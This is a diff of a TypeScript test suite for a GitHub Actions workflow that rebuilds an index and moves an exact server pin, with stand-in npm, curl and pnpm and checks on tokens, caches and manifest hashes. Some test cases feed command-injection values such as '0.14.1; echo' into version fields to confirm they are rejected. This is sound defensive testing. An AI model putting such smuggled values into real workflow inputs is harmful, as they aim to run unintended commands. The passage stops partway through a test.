@@ -1,6 +1,7 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { readFileSync } from 'node:fs';
+import { createHash } from 'node:crypto';
+import { existsSync, readFileSync } from 'node:fs';
 import { APP_TOKEN_ACTION, appTokenInputs, type Call, code, keys, read, runScripts, runStep, scalar, sortedLines, stepBody, stepIf, stepOutputs, stepIndex, stepInputs, stepName, steps, stepScript, under } from './workflow.ts';
 
 /**
@@ -22,6 +23,101 @@ const waitStep = (): string => prStep('wait');
 /** The lines of drift.yml, without comments, that match `pattern`, trimmed. */
 const linesMatching = (pattern: RegExp): string[] =>
   code(workflow()).split('\n').filter((line) => pattern.test(line)).map((line) => line.trim());
+
+/** How the build job's pin step moves the pin, and how the pr job recomputes that move on the lockfile alone. */
+const PIN_ADD = 'pnpm add -D --save-exact "@tibia.sh/tibiawiki-mcp@$server"';
+const RECOMPUTE_ADD = 'pnpm add -D --save-exact --lockfile-only --ignore-scripts --ignore-pnpmfile "@tibia.sh/tibiawiki-mcp@$SERVER"';
+
+/**
+ * What the pr job's pnpm/setup hashes for its cache key: a file the repository never holds. Even with install: false,
+ * pnpm/setup restores its lockfile-verification cache whenever that hash is not empty, and the build job, which runs
+ * the generator, could have planted the archive. So the job that gets the App token restores and saves no cache.
+ */
+const PR_NO_CACHE = '.pr-job-restores-no-cache';
+
+/**
+ * The scripts of the pr job's steps that check what the build job handed on, word for word. The build job runs
+ * dependency code and the generator, so its outputs are data: these steps check each one whole, recompute the pin
+ * themselves, keep the recompute to the two manifests and the one devDependency, and require the bytes the build job
+ * built index.db with. A change to any of them has to change this test on purpose.
+ */
+const CHECK_RUN = String.raw`if [ "$CHANGED" != true ] && [ "$CHANGED" != false ]; then
+  echo "changed is neither true nor false: '$CHANGED'" >&2
+  exit 1
+fi
+if [ "$PIN_MOVED" != true ] && [ "$PIN_MOVED" != false ]; then
+  echo "pin_moved is neither true nor false: '$PIN_MOVED'" >&2
+  exit 1
+fi
+if [ "$CHANGED" = false ] && [ "$PIN_MOVED" = false ]; then
+  echo "Neither the content nor the pin changed, so there is nothing to propose." >&2
+  exit 1
+fi
+if [ "$LEVEL" != patch ] && [ "$LEVEL" != minor ]; then
+  echo "level is neither patch nor minor: '$LEVEL'" >&2
+  exit 1
+fi
+if [[ ! $SERVER =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+  echo "Not a server version: '$SERVER'" >&2
+  exit 1
+fi
+pin=$(node -p 'require("./package.json").devDependencies["@tibia.sh/tibiawiki-mcp"]')
+decision=$(node scripts/server-pin.ts "$pin" "$pin" "$SERVER")
+if [ "$PIN_MOVED" = true ] && [ "$decision" != "move $SERVER" ]; then
+  echo "The build job moved the pin from $pin to $SERVER, which is not above it." >&2
+  exit 1
+fi
+if [ "$PIN_MOVED" = false ] && [ "$decision" != "keep $pin" ]; then
+  echo "The build job kept the pin at $SERVER, but main pins $pin." >&2
+  exit 1
+fi
+`;
+const RECOMPUTE_RUN = String.raw`if [[ ! $SERVER =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+  echo "Not a server version: '$SERVER'" >&2
+  exit 1
+fi
+${RECOMPUTE_ADD}
+`;
+const SCOPE_RUN = String.raw`files=$(git diff --name-only)
+if [ "$files" != "$(printf 'package.json\npnpm-lock.yaml')" ]; then
+  echo "The recompute changed other files than package.json and pnpm-lock.yaml:" >&2
+  printf '%s\n' "$files" >&2
+  exit 1
+fi
+git show HEAD:package.json > "$RUNNER_TEMP/main-package.json"
+node -e '
+  const fs = require("node:fs");
+  const [main, server] = process.argv.slice(1);
+  const name = "@tibia.sh/tibiawiki-mcp";
+  const before = fs.readFileSync(main, "utf8");
+  const after = fs.readFileSync("package.json", "utf8");
+  const entry = (version) => JSON.stringify(name) + ": " + JSON.stringify(version);
+  const parts = before.split(entry(JSON.parse(before).devDependencies[name]));
+  if (parts.length !== 2) throw new Error("the package.json of main does not pin " + name + " exactly once");
+  if (after !== parts.join(entry(server))) throw new Error("package.json changed in more than the pin of " + name);
+' "$RUNNER_TEMP/main-package.json" "$SERVER"
+`;
+const MANIFESTS_RUN = String.raw`for value in "$PACKAGE_JSON_SHA256" "$PNPM_LOCK_SHA256"; do
+  if [[ ! $value =~ ^[0-9a-f]{64}$ ]]; then
+    echo "Not a SHA-256 hex digest: '$value'" >&2
+    exit 1
+  fi
+done
+sha256() {
+  node -e 'process.stdout.write(require("node:crypto").createHash("sha256").update(require("node:fs").readFileSync(process.argv[1])).digest("hex"))' "$1"
+}
+package_json=$(sha256 package.json)
+pnpm_lock=$(sha256 pnpm-lock.yaml)
+if [ "$package_json" != "$PACKAGE_JSON_SHA256" ]; then
+  echo "The recomputed package.json hashes to $package_json, but the build job built with $PACKAGE_JSON_SHA256." >&2
+  exit 1
+fi
+if [ "$pnpm_lock" != "$PNPM_LOCK_SHA256" ]; then
+  echo "The recomputed pnpm-lock.yaml hashes to $pnpm_lock, but the build job built with $PNPM_LOCK_SHA256." >&2
+  exit 1
+fi
+echo "package.json and pnpm-lock.yaml are the ones the build job built index.db with."
+`;
 
 const DIGEST_A = '18ca2b2bf2c566fa6c7006977dea3558309bea165cb7d567daac1766a28bd27d';
 const DIGEST_B = '95893758373511f414cf538f81b500c2c6bf9765704e0f0a0ff0aca9d21fbc61';
@@ -52,10 +148,13 @@ const fakeDigest = (stdout: string, exit = 0): Record<string, string> => ({
     `  process.stdout.write(${JSON.stringify(stdout)});\n  process.exitCode = ${exit};\n}\n`,
 });
 
-test('the workflow runs on Tuesdays and Fridays at 06:17 UTC and by hand, and on nothing else', () => {
+test('the workflow runs on Tuesdays and Fridays at 06:17 UTC, by hand and on a server release, and on nothing else', () => {
   // Twice a week. Daily would release almost every day, since the wiki is edited daily.
-  assert.deepEqual(keys(under(code(workflow()), 'on')), ['schedule', 'workflow_dispatch'],
-    'the drift workflow has a trigger other than its schedule and workflow_dispatch');
+  assert.deepEqual(keys(under(code(workflow()), 'on')), ['schedule', 'workflow_dispatch', 'repository_dispatch'],
+    'the drift workflow has a trigger other than its schedule, workflow_dispatch and repository_dispatch');
+  // tibiawiki-mcp's release workflow sends server-release once npm accepted a publish.
+  assert.deepEqual(sortedLines(under(under(code(workflow()), 'on'), 'repository_dispatch')), ['types: [server-release]'],
+    'repository_dispatch starts drift on an event type other than server-release');
   const crons = [...workflow().matchAll(/^ *- *cron: *'([^']*)'(.*)$/gm)];
   assert.equal(crons.length, 1, 'expected exactly one cron schedule');
   assert.equal(crons[0]![1], '17 6 * * 2,5', 'the schedule is not Tuesdays and Fridays at 06:17 UTC');
@@ -125,6 +224,7 @@ test("the App key is the one secret drift reads, and only the pr job's token ste
   assert.deepEqual(linesMatching(/\bsteps\.token\b/), ['GH_TOKEN: ${{ steps.token.outputs.token }}'],
     'the token is read somewhere other than one GH_TOKEN');
   assert.deepEqual(sortedLines(under(stepBody(proposeStep()), 'env')), [
+    'CHANGED: ${{ needs.build.outputs.changed }}',
     'COMMITTED: ${{ needs.build.outputs.committed }}',
     'GH_TOKEN: ${{ steps.token.outputs.token }}',
     'GIT_AUTHOR_EMAIL: 41898282+github-actions[bot]@users.noreply.github.com',
@@ -134,6 +234,7 @@ test("the App key is the one secret drift reads, and only the pr job's token ste
     'HOLD: ${{ needs.build.outputs.hold }}',
     'REASONS: ${{ needs.build.outputs.reasons }}',
     'REBUILT: ${{ needs.build.outputs.rebuilt }}',
+    'SERVER: ${{ needs.build.outputs.server }}',
     'VERSION: ${{ steps.version.outputs.version }}',
   ], 'the propose step does not get exactly the App token, its values and the commit identity');
   assert.doesNotMatch(stepScript(workflow(), 'propose'), /TIBIA_SH_APP|github\.token/, 'the propose script names a credential');
@@ -160,10 +261,11 @@ test('the merge wait reads with github.token', () => {
   assert.doesNotMatch(prJob().replace(wait, ''), /\bgithub\.token\b/, 'a pr job step other than the wait reads github.token');
 });
 
-test('the pr job waits for the build job, and runs only on main when the digests differ', () => {
+test('the pr job waits for the build job, and runs only on main when the digests differ or the pin moved', () => {
   assert.equal(scalar(prJob(), 'needs'), 'build', 'the pr job does not need the build job');
-  assert.equal(scalar(prJob(), 'if'), "${{ github.ref == 'refs/heads/main' && needs.build.outputs.changed == 'true' }}",
-    'the pr job is not gated on main and on a changed digest');
+  assert.equal(scalar(prJob(), 'if'),
+    "${{ github.ref == 'refs/heads/main' && (needs.build.outputs.changed == 'true' || needs.build.outputs.pin_moved == 'true') }}",
+    'the pr job is not gated on main and on a changed digest or a moved pin');
 });
 
 test('the pr job is bounded at 75 minutes, room for the 60 minute wait for the merge', () => {
@@ -266,12 +368,14 @@ test("the only cache either job restores or saves is pnpm/setup's lockfile-verif
   const uvs = all.filter((step) => /uses: *astral-sh\/setup-uv@/.test(step));
   assert.equal(uvs.length, 1, 'expected one setup-uv, in the build job');
   assert.equal(scalar(stepInputs(uvs[0]!), 'enable-cache'), 'false', 'setup-uv caches');
-  const pnpms = all.filter((step) => /uses: *pnpm\/setup@/.test(step));
-  assert.equal(pnpms.length, 1, 'expected one pnpm/setup, in the build job');
+  const pnpms = steps(buildJob()).filter((step) => /uses: *pnpm\/setup@/.test(step));
+  assert.equal(pnpms.length, 1, 'expected one pnpm/setup in the build job');
   const inputs = stepInputs(pnpms[0]!);
   assert.equal(scalar(inputs, 'cache'), undefined, 'pnpm/setup caches the pnpm store');
   assert.equal(scalar(inputs, 'install'), 'true',
     'pnpm/setup saves its lockfile-verification record only at the end of the job, after the generator ran');
+  // The one exception is the pr job's, which restores and saves nothing: see the test of its inputs.
+  assert.equal(steps(prJob()).filter((step) => /uses: *pnpm\/setup@/.test(step)).length, 1, 'expected one pnpm/setup in the pr job');
 });
 
 test('the build job installs an exact uv version', () => {
@@ -306,12 +410,15 @@ test("both digest steps run this repository's scripts/index-digest.ts on index.d
   }
 });
 
-test('the server is pinned exactly, so a newer one is a reviewed change', () => {
+test("the server stays pinned exactly, and only drift's pin steps move it", () => {
   // The pinned server builds the index with build-index and validates it with serve, so which
   // server that is decides what the drift job publishes. `^0.3.0` could never reach 0.4, and
   // nothing moved it, so the drift job stayed on 0.3.1 while the server went to 0.10.0. An exact
-  // pin says which server it is, and moves only by a commit that docs/MAINTAINING.md asks for
-  // whenever the server's indexer changes.
+  // pin says which server it is. The build job's pin step moves it with pnpm add --save-exact, and
+  // the pr job recomputes that move on the lockfile alone, and nothing else in drift adds a package.
+  const adds = runScripts(workflow()).flatMap((script) => script.split('\n').filter((line) => /\bpnpm +(?:add|install|i|update|up)\b/.test(line)))
+    .map((line) => line.trim()).sort();
+  assert.deepEqual(adds, [PIN_ADD, RECOMPUTE_ADD].sort(), 'drift changes the dependencies other than by its two pin steps');
   const manifest = JSON.parse(readFileSync(new URL('../package.json', import.meta.url), 'utf8')) as
     { devDependencies?: Record<string, string> };
   const pin = manifest.devDependencies?.['@tibia.sh/tibiawiki-mcp'];
@@ -329,8 +436,10 @@ test('the build job tests the rebuilt index, and uploads it only after that and 
   assert.ok(build < suite, 'pnpm test runs before build-index, so it tests the committed index');
   assert.equal(uploads.length, 1, 'expected exactly one upload');
   assert.ok(suite < uploads[0]!, `${stepName(list[uploads[0]!]!)} uploads before pnpm test has passed`);
-  assert.equal(stepIf(list[uploads[0]!]!), "${{ steps.digests.outputs.changed == 'true' }}",
-    'the upload is not gated on a changed digest');
+  // The pr job runs when the content changed or the pin moved, and downloads the artifact either way.
+  assert.equal(stepIf(list[uploads[0]!]!), "${{ steps.digests.outputs.changed == 'true' || steps.pin.outputs.pin_moved == 'true' }}",
+    'the upload is not gated on a changed digest or a moved pin');
+  assert.equal(scalar(stepInputs(list[uploads[0]!]!), 'path'), 'index.db', 'the artifact holds more than index.db');
 });
 
 /** The build job's guard command, as the workflow runs it. */
@@ -400,23 +509,28 @@ test('the guard step fails, and writes no hold, when the guard cannot read an in
   assert.equal(partial.output, '', 'the step wrote an output when the guard failed after printing');
 });
 
-test('the pr job runs no pnpm script', () => {
-  // R33: the job that can push runs only git, gh and node one-liners.
-  assert.doesNotMatch(prJob(), /\bpnpm\b|\bnpx\b|\bnpm +(?:run|run-script|test|start|exec|install|i|ci)\b/);
+test('the pr job runs no pnpm script, and its one pnpm command recomputes the pin on the lockfile alone', () => {
+  // R33: the job that can push runs only git, gh, npm view and node on its own checkout. pnpm add with
+  // --lockfile-only, --ignore-scripts and --ignore-pnpmfile installs nothing and runs no dependency code.
+  const pnpm = runScripts(prJob()).flatMap((script) => script.split('\n').filter((line) => /(?<![\w-])pnpm(?![\w-])/.test(line))).map((line) => line.trim());
+  assert.deepEqual(pnpm, [RECOMPUTE_ADD], 'the pr job runs pnpm other than to recompute the pin');
+  assert.doesNotMatch(prJob(), /\bnpx\b|\bnpm +(?:run|run-script|test|start|exec|install|i|ci)\b/);
 });
 
 test('every output and step value the jobs pass along is one that is written', () => {
   // A misspelt reference evaluates to an empty string, not an error. An empty `changed`
   // would skip the pr job forever, and look like a wiki that never moves.
   const outputs = under(buildJob(), 'outputs');
-  const declared = new Map([...outputs.matchAll(/^ *([\w-]+): *\$\{\{ *steps\.([\w-]+)\.outputs\.([\w-]+)(?: *\|\| *'false')? *\}\}$/gm)]
+  const declared = new Map([...outputs.matchAll(/^ *([\w-]+): *\$\{\{ *steps\.([\w-]+)\.outputs\.([\w-]+)(?: *\|\| *'(?:false|patch)')? *\}\}$/gm)]
     .map((match) => [match[1]!, { step: match[2]!, name: match[3]! }]));
   assert.equal(outputs.split('\n').filter((line) => line.trim() !== '').length, declared.size, 'the build job declares an output this test cannot read');
-  assert.deepEqual([...declared.keys()].sort(), ['changed', 'committed', 'hold', 'reasons', 'rebuilt', 'sha256']);
-  // The guard runs only when the content changed, and a skipped step's output is empty, so hold
-  // falls back to false. Nothing else may fall back.
+  assert.deepEqual([...declared.keys()].sort(),
+    ['changed', 'committed', 'hold', 'level', 'package_json_sha256', 'pin_moved', 'pnpm_lock_sha256', 'reasons', 'rebuilt', 'server', 'sha256']);
+  // The guard and the schema level run only when the content changed, and a skipped step's output is
+  // empty, so hold falls back to false and level to patch. Nothing else may fall back.
   assert.equal(scalar(outputs, 'hold'), "${{ steps.guard.outputs.hold || 'false' }}", 'hold does not fall back to false');
-  assert.equal(outputs.match(/\|\|/g)?.length, 1, 'an output other than hold falls back to a value');
+  assert.equal(scalar(outputs, 'level'), "${{ steps.schema.outputs.level || 'patch' }}", 'level does not fall back to patch');
+  assert.equal(outputs.match(/\|\|/g)?.length, 2, 'an output other than hold and level falls back to a value');
   const writes = (id: string) => new Set([...stepScript(workflow(), id).matchAll(/^ *echo "([\w-]+)(?:=|<<)/gm)].map((match) => match[1]!));
   for (const [output, { step, name }] of declared) {
     assert.equal(name, output, `the build output ${output} reads ${name}`);
@@ -515,11 +629,15 @@ test('the pr job takes the artifact only when its sha256 is the one the build jo
 const manifestAt = (version: string): string =>
   readFileSync(new URL('../package.json', import.meta.url), 'utf8').replace(/"version": "[^"]*"/, `"version": "${version}"`);
 
-/** Runs the version step in a checkout at `current`, with npm printing `npmStdout` and exiting `npmExit`. */
-const runVersion = (current: string, npmStdout: string, npmExit = 0) =>
+/**
+ * Runs the version step in a checkout at `current`, with npm printing `npmStdout` and exiting `npmExit`, for a refresh
+ * whose content changed at `level`.
+ */
+const runVersion = (current: string, npmStdout: string, npmExit = 0, level = 'patch') =>
   runStep(stepScript(workflow(), 'version'), {
     files: { 'package.json': manifestAt(current) },
     commands: { npm: `process.stdout.write(${JSON.stringify(npmStdout)});\nprocess.exitCode = ${npmExit};\n` },
+    env: { CHANGED: 'true', LEVEL: level },
   });
 
 test('the version step sets the patch after the highest version npm lists in the package major', () => {
@@ -634,6 +752,8 @@ const GITHUB_TOKEN = 'stand-in-github-token';
 /** What both steps of the pr job read from the runner and their env, but the token and what propose hands on. */
 const PR_ENV = {
   VERSION: '3.0.1',
+  SERVER: '0.13.1',
+  CHANGED: 'true',
   COMMITTED: DIGEST_A,
   REBUILT: DIGEST_B,
   HOLD: 'false',
@@ -714,7 +834,8 @@ test('the pr job force-pushes drift/index and opens a pull request carrying both
   assert.deepEqual(push[0]!.slice(push[0]!.indexOf('push')), ['push', '--force', 'origin', 'HEAD:refs/heads/drift/index']);
   assert.ok(git.some((args) => args[0] === 'commit'), 'nothing was committed');
   const add = git.find((args) => args[0] === 'add');
-  assert.deepEqual(add?.slice(1).sort(), ['index.db', 'package.json'], 'the commit does not take exactly index.db and package.json');
+  assert.deepEqual(add?.slice(1).sort(), ['index.db', 'package.json', 'pnpm-lock.yaml'],
+    'the commit does not take exactly index.db, package.json and pnpm-lock.yaml');
   const commit = git.findIndex((args) => args[0] === 'commit');
   const revParse = git.findIndex((args) => args[0] === 'rev-parse');
   assert.deepEqual(git[revParse], ['rev-parse', 'HEAD'], 'the step does not record the commit it pushes');
@@ -931,6 +1052,10 @@ test('the pr job pushes and opens nothing when a value it was given is not valid
     ['hold is empty', { HOLD: '' }],
     ['hold is neither true nor false', { HOLD: 'yes' }],
     ['a held refresh has no reasons', { HOLD: 'true', REASONS: '' }],
+    ['the server is empty', { SERVER: '' }],
+    ['the server is not x.y.z', { SERVER: '0.14.1; echo' }],
+    ['changed is empty', { CHANGED: '' }],
+    ['changed is neither true nor false', { CHANGED: 'yes' }],
   ];
   for (const [what, override] of cases) {
     const run = runPr({}, { ...PR_ENV, ...override });
@@ -961,6 +1086,508 @@ test('the wait reads nothing when a value propose handed on, or one of its bound
     assert.notEqual(run.status, 0, `the wait passed when ${what}\n${run.log}`);
     assert.deepEqual(run.calls, [], `the wait ran ${run.calls.map((call) => call.command).join(', ')} when ${what}`);
   }
+});
+
+/** The server pin in package.json as committed, set to `server`, at package version `version`. */
+const manifestWithPin = (server: string, version = '3.2.1'): string => {
+  const manifest = manifestAt(version);
+  const pinned = manifest.replace(/"@tibia\.sh\/tibiawiki-mcp": "[^"]*"/, `"@tibia.sh/tibiawiki-mcp": "${server}"`);
+  assert.ok(pinned.includes(`"@tibia.sh/tibiawiki-mcp": "${server}"`), 'package.json names no server to pin');
+  return pinned;
+};
+
+/** A lockfile's stand-in text. The pin steps only hash it, and the stand-in pnpm appends to it. */
+const LOCK = "lockfileVersion: '9.0'\n";
+
+/** The real scripts/server-pin.ts, which the pin step and the pr job's check run with the real node. */
+const serverPinScript = (): string => readFileSync(new URL('../scripts/server-pin.ts', import.meta.url), 'utf8');
+
+const sha256 = (text: string): string => createHash('sha256').update(text).digest('hex');
+
+/** The tarball npm lists for server `version`, which the pin step waits for. */
+const tarballOf = (version: string): string => `https://registry.npmjs.org/@tibia.sh/tibiawiki-mcp/-/tibiawiki-mcp-${version}.tgz`;
+
+/**
+ * Stand-in JavaScript for a command that answers each call of one kind with the next of `answers`, the last one
+ * repeated, counting its calls in RUNNER_TEMP/`counter`. An answer of E404 prints npm's error and exits 1.
+ */
+const inTurn = (counter: string, answers: string[]): string =>
+  `const fs = require('node:fs');\n` +
+  `const file = process.env.RUNNER_TEMP + '/${counter}';\n` +
+  `const count = fs.existsSync(file) ? Number(fs.readFileSync(file, 'utf8')) : 0;\n` +
+  `fs.writeFileSync(file, String(count + 1));\n` +
+  `const answers = ${JSON.stringify(answers)};\n` +
+  `const answer = answers[Math.min(count, answers.length - 1)];\n` +
+  `if (answer === 'E404') { process.stderr.write('npm error code E404\\n'); process.exitCode = 1; }\n` +
+  `else process.stdout.write(answer);\n`;
+
+/**
+ * A stand-in npm for the pin step. `npm view @tibia.sh/tibiawiki-mcp version` prints `latest` and exits `latestExit`,
+ * and each view of a version's tarball prints the next of `listed`. Any other call fails.
+ */
+const fakePinNpm = (latest: string, listed: string[], latestExit = 0): string =>
+  `const args = process.argv.slice(2);\n` +
+  `if (args.join(' ') === 'view @tibia.sh/tibiawiki-mcp version') { process.stdout.write(${JSON.stringify(latest)}); process.exitCode = ${latestExit}; }\n` +
+  `else if (args.length === 3 && args[0] === 'view' && /^@tibia\\.sh\\/tibiawiki-mcp@\\d+\\.\\d+\\.\\d+$/.test(args[1]) && args[2] === 'dist.tarball') {\n` +
+  inTurn('views', listed) +
+  `} else { process.stderr.write('the stand-in npm does not answer this call\\n'); process.exitCode = 98; }\n`;
+
+/** A stand-in curl that prints each HEAD's status code in turn, as `--write-out '%{http_code}'` does. */
+const fakeCurl = (statuses: string[]): string => inTurn('heads', statuses);
+
+/** A stand-in pnpm whose add pins the server at the version it names, in package.json and the lockfile, or does nothing. */
+const fakePinPnpm = (pins = true): string => pins
+  ? String.raw`const fs = require('node:fs');
+const spec = process.argv.at(-1);
+const version = spec.slice('@tibia.sh/tibiawiki-mcp@'.length);
+fs.writeFileSync('package.json', fs.readFileSync('package.json', 'utf8').replace(/"@tibia\.sh\/tibiawiki-mcp": "[^"]*"/, '"@tibia.sh/tibiawiki-mcp": "' + version + '"'));
+fs.appendFileSync('pnpm-lock.yaml', 'server: ' + version + '\n');
+`
+  : '';
+
+type PinScenario = {
+  event?: string;
+  requested?: string;
+  pin?: string;
+  latest?: string;
+  latestExit?: number;
+  listed?: string[];
+  heads?: string[];
+  pins?: boolean;
+  env?: Record<string, string>;
+};
+
+/** Runs the build job's pin step in a checkout that pins `pin`, against a stand-in npm, curl and pnpm. */
+const runPin = ({ event = 'schedule', requested = '', pin = '0.13.1', latest = '0.13.1\n', latestExit = 0, listed = ['E404'], heads = ['200'], pins = true, env = {} }: PinScenario = {}) =>
+  runStep(stepScript(workflow(), 'pin'), {
+    files: { 'package.json': manifestWithPin(pin), 'pnpm-lock.yaml': LOCK, 'scripts/server-pin.ts': serverPinScript() },
+    commands: { npm: fakePinNpm(latest, listed, latestExit), curl: fakeCurl(heads), pnpm: fakePinPnpm(pins) },
+    env: { EVENT: event, REQUESTED: requested, POLL_SECONDS: '0', DEADLINE_SECONDS: '60', ...env },
+  });
+
+/** What the pin step hands on for a checkout that ends with `manifest` and `lock`. */
+const pinOutput = (server: string, moved: boolean, manifest: string, lock: string): string =>
+  `server=${server}\npin_moved=${moved}\npackage_json_sha256=${sha256(manifest)}\npnpm_lock_sha256=${sha256(lock)}\n`;
+
+const commandsOf = (calls: Call[]): string[] => calls.map((call) => call.command);
+
+test('the pin step runs right after the install, before the generator, and holds no token', () => {
+  const list = steps(buildJob());
+  const pin = stepIndex(list, 'pin');
+  const setup = list.findIndex((step) => /uses: *pnpm\/setup@/.test(step));
+  const build = list.findIndex((step) => /\bpnpm build-index\b/.test(step));
+  assert.equal(pin, setup + 1, 'the pin step is not the first step after the install');
+  assert.ok(pin < build, 'the pin step runs after pnpm build-index');
+  assert.equal(scalar(stepBody(list[pin]!), 'name'), 'Pin the server');
+  assert.equal(stepIf(list[pin]!), undefined, 'the pin step runs only sometimes');
+  // The payload reaches the script through env alone, and no credential does.
+  assert.deepEqual(sortedLines(under(stepBody(list[pin]!), 'env')), [
+    'EVENT: ${{ github.event_name }}',
+    'REQUESTED: ${{ github.event.client_payload.version }}',
+  ], 'the pin step gets more than the event and the version it asks for');
+  assert.doesNotMatch(list[pin]!, /\bsecrets\b|\bgithub\.token\b|\bsteps\.token\b|_TOKEN\b/, 'the pin step holds a token');
+  assert.ok(stepScript(workflow(), 'pin').split('\n').some((line) => line.trim() === PIN_ADD), `the pin step does not run ${PIN_ADD}`);
+});
+
+test('the pin step keeps the pin when npm lists nothing newer, and hands on the hashes of the manifests', () => {
+  const run = runPin();
+  assert.equal(run.status, 0, run.log);
+  assert.equal(run.output, pinOutput('0.13.1', false, manifestWithPin('0.13.1'), LOCK));
+  assert.deepEqual(run.calls, [{ command: 'npm', args: ['view', '@tibia.sh/tibiawiki-mcp', 'version'] }]);
+  assert.equal(run.checkout['package.json'], manifestWithPin('0.13.1'), 'package.json changed');
+  // A version from anything but a server-release dispatch is not asked for.
+  const byHand = runPin({ event: 'workflow_dispatch', requested: '9.9.9' });
+  assert.equal(byHand.status, 0, byHand.log);
+  assert.equal(byHand.output, pinOutput('0.13.1', false, manifestWithPin('0.13.1'), LOCK));
+});
+
+test('on its schedule, the pin step moves the pin to the latest server once npm serves its tarball', () => {
+  const run = runPin({ latest: '0.14.1\n', listed: [`${tarballOf('0.14.1')}\n`] });
+  assert.equal(run.status, 0, run.log);
+  const manifest = manifestWithPin('0.14.1');
+  const lock = `${LOCK}server: 0.14.1\n`;
+  assert.equal(run.checkout['package.json'], manifest, 'package.json does not pin 0.14.1');
+  assert.equal(run.output, pinOutput('0.14.1', true, manifest, lock), 'the hashes are not those of the manifests pnpm add left');
+  assert.deepEqual(run.calls, [
+    { command: 'npm', args: ['view', '@tibia.sh/tibiawiki-mcp', 'version'] },
+    { command: 'npm', args: ['view', '@tibia.sh/tibiawiki-mcp@0.14.1', 'dist.tarball'] },
+    { command: 'curl', args: ['--silent', '--head', '--output', '/dev/null', '--write-out', '%{http_code}', '--max-time', '30', tarballOf('0.14.1')] },
+    { command: 'pnpm', args: ['add', '-D', '--save-exact', '@tibia.sh/tibiawiki-mcp@0.14.1'] },
+  ]);
+});
+
+test('on a server-release dispatch, the pin step waits for npm to list the version and serve its tarball, then pins it', () => {
+  // npm does not know the version at first, then lists it before its tarball answers.
+  const run = runPin({ event: 'repository_dispatch', requested: '0.15.0', latest: '0.14.1\n', listed: ['E404', '', `${tarballOf('0.15.0')}\n`], heads: ['404', '200'] });
+  assert.equal(run.status, 0, run.log);
+  assert.deepEqual(commandsOf(run.calls), ['npm', 'npm', 'npm', 'npm', 'curl', 'npm', 'curl', 'pnpm']);
+  assert.deepEqual(run.calls.at(-1), { command: 'pnpm', args: ['add', '-D', '--save-exact', '@tibia.sh/tibiawiki-mcp@0.15.0'] });
+  assert.equal(stepOutputs(run.output)['server'], '0.15.0');
+  assert.equal(stepOutputs(run.output)['pin_moved'], 'true');
+});
+
+test('a server-release dispatch at or below the pin keeps it, and ends the step green', () => {
+  for (const requested of ['0.13.1', '0.12.0', '0.9.9']) {
+    const run = runPin({ event: 'repository_dispatch', requested, latest: '0.14.1\n' });
+    assert.equal(run.status, 0, run.log);
+    assert.equal(run.output, pinOutput('0.13.1', false, manifestWithPin('0.13.1'), LOCK), `the dispatch of ${requested} moved the pin`);
+    assert.deepEqual(commandsOf(run.calls), ['npm'], `the dispatch of ${requested} waited for npm or ran pnpm`);
+  }
+  const refused = runPin({ event: 'repository_dispatch', requested: '0.12.0' });
+  assert.match(refused.log, /^::notice::.*0\.12\.0.*0\.13\.1/m, 'a refused dispatch does not say so');
+});
+
+test('the pin step asks npm nothing when a server-release dispatch names no x.y.z version', () => {
+  for (const requested of ['', '0.15', '0.15.0\n', '0.15.0; echo', 'v0.15.0', ' 0.15.0', '0.15.0-rc.1', 'latest']) {
+    const run = runPin({ event: 'repository_dispatch', requested, latest: '0.14.1\n' });
+    assert.notEqual(run.status, 0, `the step passed on the version ${JSON.stringify(requested)}\n${run.log}`);
+    assert.deepEqual(run.calls, [], `the step ran ${commandsOf(run.calls).join(', ')} on the version ${JSON.stringify(requested)}`);
+    assert.equal(run.output, '', `the step handed something on for the version ${JSON.stringify(requested)}`);
+  }
+});
+
+test('the pin step pins nothing when npm does not serve the version by the deadline', () => {
+  const cases: Array<[string, PinScenario]> = [
+    ['npm never lists the version', { listed: ['E404'] }],
+    ['npm lists another tarball', { listed: [`${tarballOf('0.14.1').replace('registry.npmjs.org', 'registry.example.com')}\n`] }],
+    ['the tarball never answers 200', { listed: [`${tarballOf('0.14.1')}\n`], heads: ['404'] }],
+  ];
+  for (const [what, scenario] of cases) {
+    const run = runPin({ latest: '0.14.1\n', ...scenario, env: { DEADLINE_SECONDS: '0' } });
+    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
+    assert.ok(!commandsOf(run.calls).includes('pnpm'), `the step ran pnpm when ${what}`);
+    assert.equal(run.output, '', `the step handed something on when ${what}`);
+    assert.match(run.log, /^::error::npm did not serve server 0\.14\.1 within 0 seconds\.$/m, `the step does not say npm did not serve it when ${what}`);
+  }
+  const another = runPin({ latest: '0.14.1\n', listed: ['https://registry.example.com/tibiawiki-mcp-0.14.1.tgz\n'], env: { DEADLINE_SECONDS: '0' } });
+  assert.ok(!commandsOf(another.calls).includes('curl'), 'the step sent a HEAD to a tarball npm is not meant to list');
+});
+
+test('the pin step fails, and hands nothing on, when it cannot decide or pnpm add does not pin the version', () => {
+  const cases: Array<[string, PinScenario]> = [
+    ['npm cannot read the latest version', { latestExit: 1 }],
+    ['npm prints no version as latest', { latest: 'latest\n' }],
+    ['npm prints nothing as latest', { latest: '' }],
+    ['package.json pins a range', { pin: '^0.13.1' }],
+    ['pnpm add leaves the old pin', { latest: '0.14.1\n', listed: [`${tarballOf('0.14.1')}\n`], pins: false }],
+    ['the poll interval is not a whole number', { latest: '0.14.1\n', env: { POLL_SECONDS: 'x' } }],
+    ['the deadline is negative', { latest: '0.14.1\n', env: { DEADLINE_SECONDS: '-1' } }],
+  ];
+  for (const [what, scenario] of cases) {
+    const run = runPin(scenario);
+    assert.notEqual(run.status, 0, `the step passed when ${what}\n${run.log}`);
+    assert.equal(run.output, '', `the step handed something on when ${what}`);
+  }
+});
+
+/** A stand-in for scripts/schema-diff.ts that checks its arguments, prints `stdout` and exits `exit`. */
+const fakeSchemaDiff = (stdout: string, exit = 0): string =>
+  `const args = process.argv.slice(2);\n` +
+  `if (args.length !== 2 || args[0] !== process.env.RUNNER_TEMP + '/committed.db' || args[1] !== 'index.db') { process.exitCode = 2; }\n` +
+  `else { process.stdout.write(${JSON.stringify(stdout)}); process.exitCode = ${exit}; }\n`;
+
+const runSchema = (stdout: string, exit = 0) =>
+  runStep(stepScript(workflow(), 'schema'), { files: { 'package.json': '{ "type": "module" }\n', 'scripts/schema-diff.ts': fakeSchemaDiff(stdout, exit) } });
+
+test('the schema level runs after the guard, only when the content changed, on the kept and the rebuilt index', () => {
+  const list = steps(buildJob());
